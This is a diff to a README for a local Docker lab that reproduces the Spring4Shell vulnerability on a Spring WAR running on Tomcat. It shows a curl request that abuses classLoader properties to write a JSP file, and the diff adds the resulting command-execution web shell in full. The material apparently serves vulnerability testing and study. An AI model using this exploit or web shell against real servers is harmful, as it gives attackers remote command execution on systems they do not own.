@@ -12,7 +12,7 @@ Below are 2 paths to create a service. One is a spring-boot WAR running on Tomca
    - Run a container from the image        
  `mvn clean package -P war && docker build . -f Dockerfile-war -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
 2. Run curl command attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
-   1. If the jsp is not created, there is no vulnerability
+   1. If the jsp is not created, _the application is not compromised_
 ```
 curl --request POST \
   --url http://localhost:8080/springshell/zeroday \
@@ -27,7 +27,9 @@ curl --request POST \
   --data class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 ```
 3. Review jsp content:
-`docker exec -it springshell bash -c "cd webapps/ROOT;cat springshell.jsp"`
+   `docker exec -it springshell bash -c "cd webapps/ROOT;cat springshell.jsp"` will display
+   `<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//`
+   _This means the application is compromised_
 
 ### spring-boot jar
 1. Run command to:
